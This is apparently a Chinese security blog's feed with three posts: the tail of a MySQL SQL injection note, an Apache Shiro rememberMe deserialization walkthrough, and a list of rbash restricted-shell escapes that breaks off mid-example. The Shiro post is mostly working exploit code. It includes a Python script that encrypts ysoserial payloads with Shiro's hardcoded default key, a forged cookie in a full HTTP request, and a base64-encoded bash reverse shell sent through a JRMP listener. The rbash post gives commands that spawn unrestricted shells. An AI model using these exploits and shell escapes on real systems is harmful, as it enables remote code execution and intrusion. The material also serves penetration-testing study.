class="line">+----------+</span><br><span class="line">|     5644 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>其他数字a与任意数字b异或得到c</p><p>可以通过c与a异或得到b，通常b是我们sql注入想要的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (10^5644);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5644) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5638 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (10^5638);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5638) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5644 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>1、mysql的网站注入，5.0以上和5.0以下有什么区别？</p><p>MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p> 5.0以下是多用户单操作，5.0以上是多用户多操做。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h4&gt;&lt;p&gt;用户将恶意的sql语句输入到参数中，恶意语句拼接到后台sql语句，执行sql语句到时候使得攻击者获取到对应的敏感数据，比如当</summary>
      
    
    
    
    <category term="OWASP-TOP10" scheme="http://s1eady.top/categories/OWASP-TOP10/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>Shiro安全</title>
    <link href="http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-03-27T05:32:30.000Z</published>
    <updated>2020-10-16T11:47:17.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro安全"><a href="#Shiro安全" class="headerlink" title="Shiro安全"></a>Shiro安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><h2 id="Shiro的功能"><a href="#Shiro的功能" class="headerlink" title="Shiro的功能"></a>Shiro的功能</h2><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><h1 id="Apache-Shiro-反序列化漏洞实战"><a href="#Apache-Shiro-反序列化漏洞实战" class="headerlink" title="Apache Shiro 反序列化漏洞实战"></a>Apache Shiro 反序列化漏洞实战</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。实际上漏洞与shiro版本无关, 无论是否升级shiro到1.2.5及以上, 如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞。</p><h3 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h3><p>1、检索RememberMe cookie 的值<br>2、Base 64解码<br>3、使用AES解密(加密密钥硬编码)<br>4、进行反序列化操作（未作过滤处理）</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p><p>用户登录凭证的生成，加密顺序：</p><p>Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 加密后的remember Me内容</p><p>在识别用户身份的时候，需要对remember Me的字段进行解密，解密的顺序为：</p><p> remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。</p><p>1、AES加密是硬编码。</p><p>2、反序列化没有做任何过滤，外界传递什么值就反序列化什么值。</p><h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>如果登录页面有记住我的功能，登录页面的cookie中存在remeberMe=deleteMe的内容。</p><ul><li><p>使用burp测试</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/136A6698-B0F0-40A5-8222-A4778FDC93C6.png" alt="136A6698-B0F0-40A5-8222-A4778FDC93C6"></p><p>输入密码之后返回包中看到敏感字段</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200909161300847.png" alt="image-20200909161300847"></p></li><li><p>直接浏览器查看请求</p></li><li><p>fofa、shodan、zoomeye</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header&#x3D;&quot;rememberme&#x3D;deleteMe&quot;、header&#x3D;&quot;shiroCookie&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>ysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。</p><h4 id="RMI简介"><a href="#RMI简介" class="headerlink" title="RMI简介"></a>RMI简介</h4><p>Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><h4 id="RMI的序列化和反序列化"><a href="#RMI的序列化和反序列化" class="headerlink" title="RMI的序列化和反序列化"></a>RMI的序列化和反序列化</h4><p>在RMI的通信过程中，用到了很多的序列化和反序列化，而在Java中，只要进行反序列化操作就可能有漏洞。RMI通过序列化传输Remote对象，那么我们可以构造恶意的Remote对象，当服务端反序列化传输过来的数据时，就会触发反序列化。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://127.0.0.1:8080/doLogin&quot;</span></span><br><span class="line">jar_file = <span class="string">&#x27;/Users/apple/Documents/steady-sec/shiro/ysoserial.jar&#x27;</span></span><br><span class="line">cipher_key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,jar_file, <span class="string">&quot;URLDNS&quot;</span>, <span class="string">&quot;http://95d950.dnslog.cn&quot;</span>],</span><br><span class="line">                        stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送request</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">30</span>)</span><br><span class="line">    print(r.status_code)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span>d950.dnslog.cn<span class="number">112.25</span><span class="number">.12</span><span class="number">.136</span><span class="number">2020</span><span class="number">-10</span><span class="number">-10</span> <span class="number">10</span>:<span class="number">07</span>:<span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>检查key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try CipherKey :5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">checking.....</span><br><span class="line">try CipherKey :kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">generator payload done.</span><br><span class="line">send payload ok.</span><br><span class="line">checking.....</span><br><span class="line"></span><br><span class="line">vulnerable:True url:http:&#x2F;&#x2F;127.0.0.1:8080CipherKey:kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>检查gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 -t 3 -p &quot;ping -c 2 http:&#x2F;&#x2F;ax18gp.dnslog.cn&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>监听本地端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure><p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令。</p><p>Java base64编码<code>http://www.jackson-t.ca/runtime-exec-payloads.html</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</span><br></pre></td></tr></table></figure><p>CommonsCollections4、CommonsCollections2、CommonsCollections5都可以试试。</p><p>使用shiro.py 生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  shiro python shiro_poc_rember.py 127.0.0.1:6666</span><br><span class="line">rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import base64</span><br><span class="line">import subprocess</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;&#x2F;Users&#x2F;apple&#x2F;Documents&#x2F;steady-sec&#x2F;shiro&#x2F;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    BS &#x3D; AES.block_size</span><br><span class="line">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;)</span><br><span class="line">    iv &#x3D; uuid.uuid4().bytes</span><br><span class="line">    encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body &#x3D; pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    return base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    payload &#x3D; encode_rememberme(sys.argv[1])    </span><br><span class="line">print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())</span><br></pre></td></tr></table></figure><p>构造数据包，伪造cookie，发送Payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;doLogin HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 53</span><br><span class="line">Origin: http:&#x2F;&#x2F;127.0.0.1:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login;jsessionid&#x3D;65E88136CDB707384CB4A4C27659B658</span><br><span class="line">Cookie: JSESSIONID&#x3D;65E88136CDB707384CB4A4C27659B658;rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username&#x3D;admin&amp;password&#x3D;vulhub&amp;rememberme&#x3D;remember-me</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shiro安全&quot;&gt;&lt;a href=&quot;#Shiro安全&quot; class=&quot;headerlink&quot; title=&quot;Shiro安全&quot;&gt;&lt;/a&gt;Shiro安全&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简</summary>
      
    
    
    
    <category term="组件安全" scheme="http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="组件安全" scheme="http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>rbash绕过</title>
    <link href="http://s1eady.top/2019/06/22/rbash%E7%BB%95%E8%BF%87/"/>
    <id>http://s1eady.top/2019/06/22/rbash%E7%BB%95%E8%BF%87/</id>
    <published>2019-06-22T01:20:56.000Z</published>
    <updated>2020-10-09T11:29:45.535Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Rbash绕过"><a href="#Rbash绕过" class="headerlink" title="Rbash绕过"></a>Rbash绕过</h1><h3 id="什么是受限shell环境"><a href="#什么是受限shell环境" class="headerlink" title="什么是受限shell环境?"></a>什么是受限shell环境?</h3><p>受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或”阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。</p><h3 id="受限shell环境的目的"><a href="#受限shell环境的目的" class="headerlink" title="受限shell环境的目的"></a>受限shell环境的目的</h3><ul><li>提高安全性</li><li>防止受到黑客/渗透测试人员的攻击。</li><li>有时，系统管理员会创建一个受限shell环境，来防止受到某些危险命令误操作所带来的伤害。</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>拿到一个受限制的shell之后，我们需要做的就是执行一些操作，来摸清当前shell的限制情况。</p><ul><li><p>查看是否可以执行某些命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd、ls、echo</span><br></pre></td></tr></table></figure></li><li><p>检查操作符号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;、&gt;&gt;、&lt;、|</span><br></pre></td></tr></table></figure></li><li><p>检查编程语言是否可以运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl、ruby、python、php</span><br></pre></td></tr></table></figure></li><li><p>查看我们能以root用户运行那些命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo -l</span><br><span class="line">Password:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> apple on appledeMacBook-Pro:</span><br><span class="line">    env_reset, env_keep+=BLOCKSIZE, env_keep+=<span class="string">&quot;COLORFGBG COLORTERM&quot;</span>, env_keep+=__CF_USER_TEXT_ENCODING, env_keep+=<span class="string">&quot;CHARSET</span></span><br><span class="line"><span class="string">    LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE&quot;</span>, env_keep+=<span class="string">&quot;LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME&quot;</span>, env_keep+=<span class="string">&quot;LINES</span></span><br><span class="line"><span class="string">    COLUMNS&quot;</span>, env_keep+=LSCOLORS, env_keep+=SSH_AUTH_SOCK, env_keep+=TZ, env_keep+=<span class="string">&quot;DISPLAY XAUTHORIZATION XAUTHORITY&quot;</span>,</span><br><span class="line">    env_keep+=<span class="string">&quot;EDITOR VISUAL&quot;</span>, env_keep+=<span class="string">&quot;HOME MAIL&quot;</span>, lecture_file=/etc/sudo_lecture</span><br><span class="line"></span><br><span class="line">User apple may run the following commands on appledeMacBook-Pro:</span><br><span class="line">    (ALL) ALL</span><br></pre></td></tr></table></figure></li><li><p>检查具有SUID权限的文件或命令</p></li><li><p>检查当前所用的shell，具体命令为：echo $SHELL 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  blog echo $SHELL</span><br><span class="line">/bin/zsh</span><br></pre></td></tr></table></figure></li><li><p>查看当前的环境变量</p><p>env或printenv命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  blog env</span><br><span class="line">TERM_SESSION_ID&#x3D;w1t0p0:A0B301BE-DD25-4605-BC9B-7B6F99E2BF38</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;private&#x2F;tmp&#x2F;com.apple.launchd.zvhBmnseo7&#x2F;Listeners</span><br><span class="line">LC_TERMINAL_VERSION&#x3D;3.3.9</span><br><span class="line">COLORFGBG&#x3D;15;0</span><br><span class="line">ITERM_PROFILE&#x3D;Default</span><br><span class="line">XPC_FLAGS&#x3D;0x0</span><br><span class="line">LANG&#x3D;zh_CN.UTF-8</span><br></pre></td></tr></table></figure></li></ul><h3 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3><h4 id="编程语言绕过"><a href="#编程语言绕过" class="headerlink" title="编程语言绕过"></a>编程语言绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) 使用 except &gt; except spawn sh，然后执行sh</span><br><span class="line">2) 使用 python &gt; python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class="line">3) 使用 php &gt; php -a ，然后执行 exec(&quot;sh -i&quot;);</span><br><span class="line">4) 使用 perl &gt; perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br><span class="line">5) 使用 lua &gt; os.execute(&#39;&#x2F;bin&#x2F;sh&#39;).</span><br><span class="line">6) 使用 ruby &gt; exec &quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure><h4 id="常见绕过技术"><a href="#常见绕过技术" class="headerlink" title="常见绕过技术"></a>常见绕过技术</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）如果允许使用“&#x2F;”的话，则可以运行&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash。</span><br><span class="line">2）如果可以运行cp命令，则可以将&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash复制到自己的目录中。</span><br><span class="line">3) 使用 ftp &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>) 使用 gdb &gt; !/bin/sh 或者 !/bin/bash</span><br><span class="line"></span><br><span class="line">[steady@gongxinao ~]$ gdb</span><br><span class="line">GNU gdb (GDB) Red Hat Enterprise Linux <span class="number">7.6</span><span class="number">.1</span><span class="number">-119.</span>el7</span><br><span class="line">Copyright (C) <span class="number">2013</span> Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version <span class="number">3</span> <span class="keyword">or</span> later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This <span class="keyword">is</span> free software: you are free to change <span class="keyword">and</span> redistribute it.</span><br><span class="line">There <span class="keyword">is</span> NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line"><span class="keyword">and</span> <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured <span class="keyword">as</span> <span class="string">&quot;x86_64-redhat-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">(gdb) !/bin/sh</span><br><span class="line">sh<span class="number">-4.2</span>$ </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5) 使用 more&#x2F;man&#x2F;less &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash</span><br><span class="line">less 和 more阅读页面时候，也会进入命令模式，键入q则会直接退出，如果键入 !&#39;sh&#39; 则会进入一个shell。</span><br><span class="line">6) 使用 vim &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 或者 set shell&#x3D;&#x2F;bin&#x2F;bash shell</span><br><span class="line">vi steady.txt 方法vi进入编辑器命令模式</span><br><span class="line">:!&#x2F;bin&#x2F;bash   输入&#x2F;bin&#x2F;bash</span><br><span class="line">7) 使用 rvim &gt; :python import os; os.system(&quot;&#x2F;bin&#x2F;bash )</span><br><span class="line">8) 使用 scp &gt; scp -S &#x2F;path&#x2F;yourscript x y:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9) 使用 awk &gt; awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br><span class="line">[steady@gongxinao ~]$ awk &#39;BEGIN 